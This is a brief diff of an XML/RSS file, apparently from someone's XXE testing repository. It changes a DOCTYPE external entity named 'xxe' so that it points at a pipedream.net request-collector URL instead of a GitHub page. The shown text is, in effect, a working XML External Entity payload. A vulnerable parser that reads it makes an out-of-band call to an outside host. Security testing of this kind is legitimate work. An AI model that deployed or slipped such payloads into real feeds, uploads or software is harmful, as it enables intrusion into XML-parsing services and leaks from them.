@@ -2,7 +2,7 @@
 <!DOCTYPE anything
     [
         <!ELEMENT anything ANY >
-        <!ENTITY xxe SYSTEM "https://github.com/chrislam82/XML_test_82/edit/master/XXE.XML" >
+        <!ENTITY xxe SYSTEM "https://022b0d4fc5ca54f440504013751d320f.m.pipedream.net" >
     ]
 >
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
